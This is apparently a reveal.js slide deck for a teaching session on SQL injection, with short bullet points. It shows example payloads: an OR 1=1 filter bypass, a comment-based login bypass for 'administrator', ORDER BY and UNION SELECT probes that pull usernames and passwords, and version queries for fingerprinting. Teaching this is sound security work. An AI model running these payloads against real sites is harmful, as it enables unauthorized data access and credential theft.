---
title: "SSS: Session: SQL Injection"
revealOptions:
  background-color: 'aquamarine'
  transition: 'none'
---

# SQL Injection

* code injection technique
* one of the most common web security vulnerability

---

# Vulnerabilities

* Retrieving hidden data
* Subverting application logic
* UNION attacks
* Examining the database
* Blind SQL injection

---

## Retrieving hidden data

```
https://insecure-website.com/products?category=Gifts
SELECT * FROM products
WHERE category = 'Gifts'
AND released = 1
```

----

## Retrieving hidden data

```
https://insecure-website.com/products?category=Gifts'--
SELECT * FROM products
WHERE category = 'Gifts'--' 
AND released = 1
```

----


## Retrieving hidden data

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
SELECT * FROM products
WHERE category = 'Gifts'
OR 1=1--'
AND released = 1
```

---

## Subverting application logic 

```
SELECT * FROM users
WHERE username = 'wiener'
AND password = 'bluecheese'
```

----

## Subverting application logic 


```
SELECT * FROM users
WHERE username = 'administrator'--'
AND password = ''
```

---

## UNION attacks

```
SELECT * FROM products
WHERE category = 'Gifts'
```

----

## UNION attacks

```
SELECT * FROM products
WHERE category = 'Gifts'
ORDER BY 1 --'
```

----


## UNION attacks

```
SELECT * FROM products
WHERE category = 'Gifts'
UNION
SELECT 'a',NULL,NULL,NULL --'

```

----

## UNION attacks

```
SELECT * FROM products
WHERE category = 'Gifts'
UNION
SELECT username, password
FROM users --'
```

---

## Examining the database

| Database type    | Query                     |
| ---------------- | ------------------------- |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |

---

## Blind SQL injection

* the application does not return the results of the SQL query within its responses
* nor the details of any database errors
* can still be exploited to access unauthorized data
